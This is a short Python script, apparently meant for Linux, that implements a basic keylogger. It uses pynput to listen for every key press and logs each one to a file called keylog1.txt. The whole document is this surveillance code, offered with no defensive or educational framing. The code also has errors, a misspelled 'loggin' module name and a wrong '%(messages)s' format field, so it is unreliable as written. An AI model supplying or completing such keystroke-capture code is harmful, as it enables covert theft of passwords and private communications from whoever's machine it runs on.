#import libraries
#for linux
from pynput.keyboard import Key, Listener
import logging

#make a log file

log_file= ""
logging.basicConfig(filename=(log_file + "keylog1.txt"), level=loggin.DEBUG, format = '%(asctime)s: %(messages)s:')

def key_press(key):
    logging.info(str(key))
    
with Listener(on_press=key_press) as listener:
    listener.join()

